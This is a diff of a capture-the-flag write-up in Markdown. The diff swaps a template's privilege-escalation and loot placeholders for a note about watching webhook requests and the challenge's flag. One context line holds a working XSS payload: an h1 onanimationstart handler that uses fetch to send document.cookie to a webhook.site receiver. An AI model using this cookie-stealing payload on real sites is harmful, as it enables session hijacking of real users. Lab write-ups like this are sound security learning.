@@ -71,38 +71,15 @@ The payload worked so all I had to do left is setup a webhook using `webhook.sit
 <h1 style="animation-name:x" onanimationstart="fetch('?c='+document.cookie)"></h1>
 ```
 
+After sending the report to the admin, observe the webhook's incoming requests gave me this:
 
----
-
-## Privilege Escalation (Root)
-
-**Current User:** `www-data`
-
-### Enumeration
-
-- **LinPeas Findings:** `Vulnerable Sudo version`
-    
-
-### Exploitation
-
-Bash
-
-```
-# Commands to get root
-```
+![[Pasted image 20260208122024.png]]
 
 ---
 
 ## Loot & Flags
 
-- [ ] **User Flag:** `hash_here`
-    
-- [ ] **Root Flag:** `hash_here`
-    
-- [ ] **Credentials:**
-    
-    - `user:password`
-        
+**Flag:** `BKSEC{y0ur_r3p0rt_h4s_b33n_r3v13w3d_by_th3_4dm1n_h3h3h3_7c9f2a}`
 
 ---
 
